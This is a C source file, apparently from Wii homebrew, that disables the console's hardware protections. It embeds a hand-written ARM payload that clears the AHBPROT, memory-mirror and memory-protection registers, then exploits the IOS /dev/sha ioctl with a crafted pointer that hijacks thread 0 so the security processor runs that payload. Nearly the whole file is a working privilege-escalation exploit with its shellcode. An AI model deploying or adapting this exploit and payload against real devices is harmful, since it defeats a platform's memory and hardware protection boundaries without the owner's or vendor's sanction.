#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <unistd.h>

// libogc files
#include <ogc/machine/processor.h>
#include <ogc/ipc.h>
#include <ogc/cache.h>

// Local Files
#include "globals.h"

const uint8_t disable_ahbprot_payload[] = {
    0xF0, 0x00, 0xF8, 0x02, // bl #8
    0xE7, 0xFE, // b #0, keep looping main thread
    0x00, 0x00, // padding
    // actual disabling. it loads, and stores the value in 0xd800064 or'ed with 0x80000dfe 
    // this gives the PPC access to the starlet's AHB devices 
    0x4A, 0x06, // ldr  r2, [DAT_00000024]  =  0x0d800064
    0x4B, 0x07, // ldr  r3, [DAT_00000028]  =  0x80000dfe
    0x68, 0x11, // ldr  r1, [r2,#0x0]       => 0x0d800064
    0x43, 0x0B, // orrs r3, r1
    0x60, 0x13, // str  r3, [r2,#0x0]       => 0x0d800064
    // disable HW_MEMMIRR (0xd800060) by orring with 0x00000008
    0x4A, 0x06, // ldr  r2, [DAT_0000002c]  =  0x0d800060
    0x23, 0x08, // movs r3, #0x8
    0x68, 0x11, // ldr  r1, [r2,#0x0]       => 0x0d800060
    0x43, 0x0B, // orrs r3, r1
    0x60, 0x13, // str  r3, [r2,#0x0]       => 0x0d800060
    // and finish up with setting MEM_PROT_REG(0xd804202)
    0x4B, 0x04, // ldr  r3, [DAT_00008030]  =  0x0d804202
    0x22, 0x00, // movs r2, #0x0
    0x80, 0x1A, // strh r2, [r3,#0x0]       => 0x0d804202
    0x47, 0x70, // bx lr
    // data used by above code
    0x0D, 0x80, 0x00, 0x64, // DAT_00000024
    0x80, 0x00, 0x0D, 0xFE, // DAT_00000028
    0x0D, 0x80, 0x00, 0x60, // DAT_0000002c
    0x0D, 0x80, 0x42, 0x02  // DAT_00000030
};

#define DISABLE_AHBPROT_PAYLOAD_SIZE (sizeof(disable_ahbprot_payload) / sizeof(disable_ahbprot_payload[0]))

bool is_dolphin()
{
    // /dev/dolphin will never exist in an official IOS
    s32 fd = IOS_Open("/dev/dolphin", 0);
    if (fd >= 0)
    {
        IOS_Close(fd);
        return true;
    }
    return false;
}

// time to exploit /dev/sha!
bool disable_ahbprot()
{
    if (AHBPROT_DISABLED || is_dolphin()) {
        return true; // AHBPROT is already disabled, likely via launching through HBC or the user is using Dolphin. Dolphin always has it disabled however :)
    }

    // We proceed to exploit /dev/sha
    // Good amount of this is from Priiloader but ported to C from C++ lol
    s32 fd = -1;
    ioctlv* params = NULL;

    fd = IOS_Open("/dev/sha", 0);
    if (fd < 0)
        return false;

    params = (ioctlv*)memalign(sizeof(ioctlv) * 4, 32);
    if (params == NULL)
        return false;

    // Overwrite the thread 0 state with address 0 (0x80000000)
    memset(params, 0, sizeof(ioctlv) * 4);
    params[1].data = (void*)0xFFFE0028;
    params[1].len = 0;
    DCFlushRange(params, sizeof(ioctlv) *4);

    // Set code to disable AHBPROT and stay in loop

    memcpy((void*)0x80000000, disable_ahbprot_payload, DISABLE_AHBPROT_PAYLOAD_SIZE);
	DCFlushRange((void*)0x80000000, DISABLE_AHBPROT_PAYLOAD_SIZE);
	ICInvalidateRange((void*)0x80000000, DISABLE_AHBPROT_PAYLOAD_SIZE);

    s32 callRet = IOS_Ioctlv(fd, 0x00, 1, 2, params);
    if (callRet < 0)
        return false;

    // wait for it to have processed the sha init and given a timeslice to the mainthread :)
	usleep(50000);
    return true;
}